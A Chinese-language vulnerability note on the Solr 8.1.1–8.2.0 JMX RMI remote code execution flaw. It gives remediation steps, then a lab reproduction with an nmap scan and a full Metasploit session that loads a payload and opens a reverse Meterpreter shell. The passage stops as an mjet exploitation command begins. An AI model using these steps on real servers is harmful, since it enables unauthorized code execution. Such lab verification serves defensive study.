## Solr JMX远程代码执行漏洞（）

### 1. 漏洞危害  

Linux 版本Solr 8.1.1~8.2.0版本默认配置存在JMX未授权对外开放漏洞。攻击者利用该漏洞，可在未授权的情况下，远程发送精心构造的请求，从而在受影响服务器上进行远程代码执行。  

攻击者利用该漏洞可在未授权的情况下，远程发送精心构造的请求，从而在受影响服务器上进行远程代码执行。  

8.1.1~8.2.0

### 2. 修复方案

1、关闭18983端口对外开放

2、如需对外开放，务必设置JMX admin role强口令

3、设置solr.in.sh中的 ENABLE_REMOTE_JMX_OPTS=false, 然后重启solr

4、升级Solr到8.3.0版本  

### 3. 漏洞验证  

#### 1. 运行Solr 8.1.1 

下载对应的漏洞版本，或使用旧版本（自行开启JMX服务）【明天补上】  

	bogon:bin snow$ ./solr start
	*** [WARN] *** Your open file limit is currently 256.
	 It should be set to 65000 to avoid operational disruption.
	 If you no longer wish to see this warning, set SOLR_ULIMIT_CHECKS to false in your profile or solr.in.sh
	*** [WARN] ***  Your Max Processes Limit is currently 2784.
 	It should be set to 65000 to avoid operational disruption.
 	If you no longer wish to see this warning, set SOLR_ULIMIT_CHECKS to false in your profile or solr.in.sh
	Waiting up to 180 seconds to see Solr running on port 8983 [-]
	Started Solr server on port 8983 (pid=6751). Happy searching!

	bogon:bin snow$ cat solr.in.sh | grep JMX
	# Set to true to activate the JMX RMI connector to allow remote JMX client applications
	ENABLE_REMOTE_JMX_OPTS="true"
	bogon:bin snow$ cat solr.in.sh | grep 189
	# RMI_PORT=18983	

通过Nmap扫描下RMI端口开启情况：  
	
	root@kali:~# nmap 192.168.1.100 -p 18983 -sVC
	Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-20 11:44 EST
	Nmap scan report for bogon (192.168.1.100)
	Host is up (0.00028s latency).

	PORT      STATE SERVICE  VERSION
	18983/tcp open  java-rmi Java RMI Registry
	| rmi-dumpregistry: 
	|   jmxrmi
	|      implements javax.management.remote.rmi.RMIServer, 
	|     extends
	|       java.lang.reflect.Proxy
	|       fields
	|           Ljava/lang/reflect/InvocationHandler; h
	|             java.rmi.server.RemoteObjectInvocationHandler
	|             @120.197.89.235:18983
	|             extends
	|_              java.rmi.server.RemoteObject
	MAC Address: 88:E9:FE:56:FA:0C (Unknown)

	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 12.07 seconds
	
#### 2. 利用Metasploite模块  
操作指导： https://www.rapid7.com/db/modules/exploit/multi/misc/java_jmx_server  

	msf > use exploit/multi/misc/java_jmx_server
	msf exploit(multi/misc/java_jmx_server) > show targets

	Exploit targets:

   		Id  Name
   		--  ----
   		0   Generic (Java Payload)


	msf exploit(multi/misc/java_jmx_server) > show options

	Module options (exploit/multi/misc/java_jmx_server):

   		Name          Current Setting  Required  Description
   		----          ---------------  --------  -----------
   		JMXRMI        jmxrmi           yes       The name where the JMX RMI interface is bound
   		JMX_PASSWORD                   no        The password to interact with an authenticated JMX endpoint
   		JMX_ROLE                       no        The role to interact with an authenticated JMX endpoint
   		RHOST                          yes       The target address
   		RPORT                          yes       The target port (TCP)
   		SRVHOST       0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   		SRVPORT       8080             yes       The local port to listen on.
   		SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)
   		URIPATH                        no        The URI to use for this exploit (default is random)


	Exploit target:

   		Id  Name
		--  ----
   		0   Generic (Java Payload)


	msf exploit(multi/misc/java_jmx_server) > set RHOST 192.168.1.100
	RHOST => 192.168.1.100
	msf exploit(multi/misc/java_jmx_server) > set RPORT 18983
	RPORT => 18983
	msf exploit(multi/misc/java_jmx_server) > show options

	Module options (exploit/multi/misc/java_jmx_server):

   		Name          Current Setting  Required  Description
   		----          ---------------  --------  -----------
   		JMXRMI        jmxrmi           yes       The name where the JMX RMI interface is bound
   		JMX_PASSWORD                   no        The password to interact with an authenticated JMX endpoint
   		JMX_ROLE                       no        The role to interact with an authenticated JMX endpoint
   		RHOST         192.168.1.100    yes       The target address
   		RPORT         18983            yes       The target port (TCP)
   		SRVHOST       0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   		SRVPORT       8080             yes       The local port to listen on.
   		SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)
   		URIPATH                        no        The URI to use for this exploit (default is random)


	Exploit target:

   		Id  Name
   		--  ----
   		0   Generic (Java Payload)


	msf exploit(multi/misc/java_jmx_server) > exploit

	[*] Started reverse TCP handler on 192.168.1.107:4444 
	[*] 192.168.1.100:18983 - Using URL: http://0.0.0.0:8080/ZWT1jFWA
	[*] 192.168.1.100:18983 - Local IP: http://192.168.1.107:8080/ZWT1jFWA
	[*] 192.168.1.100:18983 - Sending RMI Header...
	[*] 192.168.1.100:18983 - Discovering the JMXRMI endpoint...
	[+] 192.168.1.100:18983 - JMXRMI endpoint on 120.197.89.235:18983
	[*] 192.168.1.100:18983 - Proceeding with handshake...
	[+] 192.168.1.100:18983 - Handshake with JMX MBean server on 120.197.89.235:18983
	[*] 192.168.1.100:18983 - Loading payload...
	[*] 192.168.1.100:18983 - Replied to request for mlet
	[*] 192.168.1.100:18983 - Replied to request for payload JAR
	[*] 192.168.1.100:18983 - Executing payload...
	[*] Sending stage (53845 bytes) to 192.168.1.100
	[*] Meterpreter session 1 opened (192.168.1.107:4444 -> 192.168.1.100:52920) at 2019-11-20 11:53:17 -0500

	meterpreter > sysinfo
	Computer    : bogon
	OS          : Mac OS X 10.15.1 (x86_64)
	Meterpreter : java/osx
	meterpreter > ls
	Listing: /Users/snow/Files/Git/Vulenvironment/solr-8.1.1/server
	===============================================================

	Mode              Size    Type  Last modified              Name
	----              ----    ----  -------------              ----
	100666/rw-rw-rw-  3959    fil   2018-10-25 06:22:56 -0400  README.txt
	40776/rwxrwxrw-   96      dir   2018-03-15 05:51:41 -0400  contexts
	40776/rwxrwxrw-   256     dir   2019-05-17 11:46:05 -0400  etc
	40776/rwxrwxrw-   864     dir   2019-05-22 09:20:04 -0400  lib
	40776/rwxrwxrw-   192     dir   2019-11-20 11:36:42 -0500  logs
	40776/rwxrwxrw-   224     dir   2019-05-17 11:46:05 -0400  modules
	40776/rwxrwxrw-   160     dir   2019-05-17 11:46:05 -0400  resources
	40776/rwxrwxrw-   96      dir   2018-10-24 08:44:17 -0400  scripts
	40776/rwxrwxrw-   192     dir   2019-05-17 11:46:05 -0400  solr
	40776/rwxrwxrw-   96      dir   2019-05-22 09:20:05 -0400  solr-webapp
	100666/rw-rw-rw-  160625  fil   2018-11-14 16:50:10 -0500  start.jar

	meterpreter > exit
	[*] Shutting down Meterpreter...

	[*] 192.168.1.100 - Meterpreter session 1 closed.  Reason: User exit

#### 3. 利用mjet工具  

fork mjet工具，下载本地:https://github.com/shadow-horse/mjet.git （已经默认提交依赖jar）

	snowdeMacBook-Pro:mjet snow$ java -jar jython-standalone-2.7.0.jar mjet.py 127.0.0.1 18983 shell super_secret

	MJET - MOGWAI LABS JMX Exploitation Toolkit
	===========================================
	[+] Connecting to: service:jmx:rmi:///jndi/rmi://127.0.0.1:18983/jmxrmi
  

 


